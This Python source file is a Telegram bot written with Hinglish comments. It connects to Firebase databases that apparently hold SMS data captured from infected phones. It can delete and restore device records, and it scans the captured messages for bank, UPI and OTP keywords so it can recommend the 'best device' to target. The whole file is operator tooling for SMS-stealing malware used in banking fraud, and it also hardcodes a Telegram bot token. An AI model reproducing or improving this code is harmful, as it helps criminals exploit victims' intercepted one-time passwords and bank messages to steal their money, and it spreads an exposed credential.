import telebot
from telebot import types
import requests
import json
import re
import time

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = '8227430826:AAFrqELQwziSEHhMAE9-yjyw77HHdFUkSsg'  # <--- Yahan apna Bot Token daalein
BACKUP_EXPIRY_TIME = 72 * 60 * 60  # 3 Din (72 Ghante)

# Bank SMS Keywords
BANK_KEYWORDS = [
    "bank", "otp", "debit", "credit", "account", "a/c", "balance", 
    "inr", "rs.", "rs", "upi", "transaction", "transferred", "received", 
    "withdrawn", "deposited", "hdfc", "sbi", "icici", "axis", "kotak", 
    "paytm", "phonepe", "gpay", "bhim", "verification code", "passcode",
    "neft", "imps", "rtgs", "atm", "card", "txn", "amt"
]

bot = telebot.TeleBot(BOT_TOKEN)

# ==========================================
# GLOBAL MEMORY
# ==========================================
# For Database Manager
user_db_urls = {}
user_device_nodes = {}
deleted_devices_backup = {} 

# For Bank SMS Scanner
user_fb_channels = {} 
scanned_devices_info = {} 
user_scan_queue = {} 

# ==========================================
# KEYBOARD SETUP
# ==========================================
def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_connect = types.KeyboardButton('🔗 Connect Firebase')
    btn_delete = types.KeyboardButton('🗑️ Delete Device')
    btn_recover = types.KeyboardButton('♻️ Recover Device')
    btn_channel = types.KeyboardButton('📢 Set Channel')
    btn_scan = types.KeyboardButton('🔍 Scan MSG')
    btn_logout = types.KeyboardButton('🚪 Logout All')
    markup.add(btn_connect, btn_delete, btn_recover, btn_channel, btn_scan, btn_logout)
    return markup

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def is_bank_message(text):
    if not isinstance(text, str): return False
    text = text.lower()
    return any(keyword in text for keyword in BANK_KEYWORDS)

def extract_urls(text):
    url_pattern = re.compile(r'https?://[^\s,]+')
    return url_pattern.findall(text)

# ==========================================
# START COMMAND
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name
    welcome_text = (
        f"⚡ **ULTIMATE DATABASE BOT** ⚡\n\n"
        f"Welcome, **{user_name}**! Main aapka All-in-One tool hoon. 🤖\n\n"
        f"🔹 **Database Tools:** Connect, Delete, Recover\n"
        f"🔹 **Scanner Tools:** Set Channel, Scan Bank SMS\n\n"
        f"*Status: System Online* 🟢"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())

# ==========================================
# --- PART 1: DATABASE MANAGER ---
# ==========================================
@bot.message_handler(func=lambda message: message.text == '🔗 Connect Firebase')
def connect_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_new = types.InlineKeyboardButton("➕ Add New Firebase URL", callback_data="add_new_fb")
    btn_logout = types.InlineKeyboardButton("🚪 Logout Connected Firebase", callback_data="logout_fb")
    markup.add(btn_new, btn_logout)
    bot.reply_to(message, "⚙️ **Firebase Connection Menu**\n\nWhat would you like to do?", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["add_new_fb", "logout_fb"])
def handle_connect_menu(call):
    chat_id = call.message.chat.id
    if call.data == "add_new_fb":
        bot.answer_callback_query(call.id, "Please send the URL.")
        msg = bot.send_message(chat_id, "🔗 **Please send your Firebase Realtime Database URL.**", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_firebase_url)
    elif call.data == "logout_fb":
        if chat_id in user_db_urls:
            del user_db_urls[chat_id]
            if chat_id in user_device_nodes: del user_device_nodes[chat_id]
            bot.answer_callback_query(call.id, "Logged out successfully.")
            bot.edit_message_text("🚪 **Logged Out Successfully!**", chat_id=chat_id, message_id=call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "No Firebase connected.")

def process_firebase_url(message):
    url = message.text.strip()
    if not url.startswith('http'):
        bot.reply_to(message, "❌ Invalid URL.", reply_markup=get_main_keyboard())
        return
    if not url.endswith('/'): url += '/'
        
    bot.reply_to(message, "🔄 Connecting...")
    try:
        full_data = requests.get(f"{url}.json", timeout=10).json()
        user_db_urls[message.chat.id] = url
        
        detected_node = None
        root_keys = list(full_data.keys()) if full_data else []
        for key in root_keys:
            if key.lower() in ['clients', 'devices', 'users', 'active_clients']:
                detected_node = key
                break
                
        if detected_node:
            user_device_nodes[message.chat.id] = detected_node
            total = len(full_data[detected_node])
            bot.reply_to(message, f"✅ **Connected!**\nNode: `{detected_node}`\nTotal Devices: `{total}`", parse_mode='Markdown', reply_markup=get_main_keyboard())
        else:
            user_device_nodes[message.chat.id] = "clients"
            bot.reply_to(message, f"✅ **Connected!**\nCould not auto-detect node. Will use `clients`.", parse_mode='Markdown', reply_markup=get_main_keyboard())
    except Exception as e:
        bot.reply_to(message, f"❌ Failed: {e}", reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda message: message.text == '🗑️ Delete Device')
def ask_for_device_id_to_delete(message):
    if message.chat.id not in user_db_urls:
        bot.reply_to(message, "⚠️ Connect Firebase first!", reply_markup=get_main_keyboard())
        return
    msg = bot.reply_to(message, "🗑️ **Enter Device ID to delete:**", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_delete_device)

def process_delete_device(message):
    device_id = message.text.strip()
    chat_id = message.chat.id
    url = user_db_urls[chat_id]
    bot.reply_to(message, f"🔎 Deleting `{device_id}`...")
    try:
        full_data = requests.get(f"{url}.json").json()
        deleted_from, backup_data = [], []
        if full_data:
            for root_node in full_data.keys():
                node_data = full_data[root_node]
                if isinstance(node_data, dict) and device_id in node_data:
                    backup_data.append({"node": root_node, "id": device_id, "data": node_data[device_id]})
                    requests.delete(f"{url}{root_node}/{device_id}.json")
                    deleted_from.append(f"`{root_node}`")
        if deleted_from:
            if chat_id not in deleted_devices_backup: deleted_devices_backup[chat_id] = {}
            deleted_devices_backup[chat_id][device_id] = {"data": backup_data, "timestamp": time.time()}
            bot.reply_to(message, f"✅ Deleted from: {', '.join(deleted_from)}", parse_mode='Markdown', reply_markup=get_main_keyboard())
        else:
            bot.reply_to(message, "⚠️ Device not found.", reply_markup=get_main_keyboard())
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}", reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda message: message.text == '♻️ Recover Device')
def ask_for_recover_id(message):
    if message.chat.id not in user_db_urls:
        bot.reply_to(message, "⚠️ Connect Firebase first!", reply_markup=get_main_keyboard())
        return
    msg = bot.reply_to(message, "♻️ **Enter Device ID to recover:**", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_recover_device)

def process_recover_device(message):
    device_id = message.text.strip()
    chat_id = message.chat.id
    url = user_db_urls[chat_id]
    if chat_id in deleted_devices_backup and device_id in deleted_devices_backup[chat_id]:
        backup_info = deleted_devices_backup[chat_id][device_id]
        if (time.time() - backup_info["timestamp"]) > BACKUP_EXPIRY_TIME:
            del deleted_devices_backup[chat_id][device_id]
            bot.reply_to(message, "❌ Backup Expired (Older than 3 days).", reply_markup=get_main_keyboard())
            return
        bot.reply_to(message, f"🔄 Recovering...")
        recovered = []
        for b in backup_info["data"]:
            try:
                requests.put(f"{url}{b['node']}/{device_id}.json", data=json.dumps(b['data']))
                recovered.append(f"`{b['node']}`")
            except: pass
        if recovered:
            del deleted_devices_backup[chat_id][device_id]
            bot.reply_to(message, f"✅ Recovered to: {', '.join(recovered)}", parse_mode='Markdown', reply_markup=get_main_keyboard())
        else:
            bot.reply_to(message, "❌ Recovery failed.", reply_markup=get_main_keyboard())
    else:
        bot.reply_to(message, "⚠️ No active backup found.", reply_markup=get_main_keyboard())

# ==========================================
# --- PART 2: BANK SMS SCANNER ---
# ==========================================
@bot.message_handler(func=lambda message: message.text == '📢 Set Channel')
def ask_for_channel(message):
    msg = bot.reply_to(message, "📢 **Send Telegram Channel Link/Username:**")
    bot.register_next_step_handler(msg, save_channel)

def save_channel(message):
    channel = message.text.strip()
    if channel.startswith('https://t.me/'): channel = channel.replace('https://t.me/', '@')
    elif not channel.startswith('@'): channel = '@' + channel
    user_fb_channels[message.chat.id] = channel
    bot.reply_to(message, f"✅ Channel set to: `{channel}`", parse_mode='Markdown', reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda message: message.text == '🔍 Scan MSG')
def start_scan(message):
    bot.reply_to(message, "🔄 **Paste Firebase URLs (one per line or comma separated):**")
    msg = bot.send_message(message.chat.id, "⚠️ Standard bots can't read channel history directly, please provide URLs.")
    bot.register_next_step_handler(msg, process_scan_request)

def process_scan_request(message):
    chat_id = message.chat.id
    urls = extract_urls(message.text)
    if not urls:
        bot.reply_to(message, "❌ No valid URLs found.", reply_markup=get_main_keyboard())
        return
    bot.reply_to(message, f"🔎 Scanning {len(urls)} URLs one-by-one for Bank SMS...")
    user_scan_queue[chat_id] = urls
    scanned_devices_info[chat_id] = []
    scan_next_url(chat_id)

def scan_next_url(chat_id):
    urls = user_scan_queue.get(chat_id, [])
    if not urls:
        if not scanned_devices_info.get(chat_id):
            bot.send_message(chat_id, "❌ No online devices with Bank SMS found.", reply_markup=get_main_keyboard())
        else:
            recommend_device(chat_id, 0)
        return
    url = urls.pop(0)
    if not url.endswith('/'): url += '/'
    try:
        full_data = requests.get(f"{url}.json", timeout=10).json()
        if not full_data: scan_next_url(chat_id); return
        for node, data in full_data.items():
            if isinstance(data, dict):
                for dev_id, dev_info in data.items():
                    if isinstance(dev_info, dict) and str(dev_info.get('status', '')).lower() == 'true':
                        msgs = dev_info.get('messages', dev_info.get('massages', {}))
                        bank_count = 0
                        if isinstance(msgs, dict):
                            for m in msgs.values():
                                t = m if isinstance(m, str) else m.get('message', m.get('text', ''))
                                if is_bank_message(t): bank_count += 1
                        elif isinstance(msgs, list):
                            for m in msgs:
                                t = m if isinstance(m, str) else m.get('message', m.get('text', ''))
                                if is_bank_message(t): bank_count += 1
                        if bank_count > 0:
                            scanned_devices_info[chat_id].append({
                                "url": url, "device_id": dev_id, "node": node, "battery": dev_info.get('battery', 'N/A'),
                                "last_offline": dev_info.get('lastOffline', 'N/A'), "total_msgs": len(msgs), "bank_msgs": bank_count
                            })
                            recommend_device(chat_id, len(scanned_devices_info[chat_id]) - 1)
                            return
        scan_next_url(chat_id)
    except Exception:
        scan_next_url(chat_id)

def recommend_device(chat_id, index):
    devices = scanned_devices_info.get(chat_id, [])
    if index >= len(devices):
        bot.send_message(chat_id, "✅ **Scan Complete!**", reply_markup=get_main_keyboard())
        return
    dev = devices[index]
    text = (
        f"🎯 **BEST DEVICE FOUND**\n\n"
        f"📱 **ID:** `{dev['device_id']}`\n"
        f"🔋 **Battery:** {dev['battery']}\n"
        f"🏦 **Bank Msgs:** {dev['bank_msgs']}\n"
        f"🔗 **URL:** `{dev['url']}`"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("⏭️ Skip", callback_data=f"skip_{index}"), types.InlineKeyboardButton("ℹ️ Info", callback_data=f"info_{index}"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('skip_') or call.data.startswith('info_'))
def handle_scan_buttons(call):
    action, index = call.data.split('_')
    index = int(index)
    chat_id = call.message.chat.id
    if action == 'skip':
        bot.answer_callback_query(call.id, "Skipping...")
        if user_scan_queue.get(chat_id): scan_next_url(chat_id)
        else: recommend_device(chat_id, index + 1)
    elif action == 'info':
        devices = scanned_devices_info.get(chat_id, [])
        if index < len(devices):
            dev = devices[index]
            info_text = (
                f"ℹ️ **DEVICE INFO**\n\n"
                f"🆔 **ID:** `{dev['device_id']}`\n"
                f"🔋 **Battery:** {dev['battery']}\n"
                f"⏳ **Last Offline:** {dev['last_offline']}\n"
                f"💬 **Total Msgs:** {dev['total_msgs']}\n"
                f"🏦 **Bank Msgs:** {dev['bank_msgs']}\n"
                f"🔗 **Firebase:** `{dev['url']}`"
            )
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, info_text, parse_mode='Markdown')

# ==========================================
# LOGOUT ALL
# ==========================================
@bot.message_handler(func=lambda message: message.text == '🚪 Logout All')
def logout_all(message):
    chat_id = message.chat.id
    if chat_id in user_db_urls: del user_db_urls[chat_id]
    if chat_id in user_device_nodes: del user_device_nodes[chat_id]
    if chat_id in deleted_devices_backup: del deleted_devices_backup[chat_id]
    if chat_id in user_fb_channels: del user_fb_channels[chat_id]
    if chat_id in scanned_devices_info: del scanned_devices_info[chat_id]
    if chat_id in user_scan_queue: del user_scan_queue[chat_id]
    bot.reply_to(message, "✅ **Logged out from all services!**", reply_markup=get_main_keyboard())

# ==========================================
# HANDLE UNKNOWN
# ==========================================
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.reply_to(message, "🤖 **Please use the buttons below to interact with the bot.**", reply_markup=get_main_keyboard())

# ==========================================
# RUN BOT
# ==========================================
if __name__ == '__main__':
    print("🤖 Ultimate All-in-One Bot is running...")
    bot.polling(none_stop=True, timeout=60)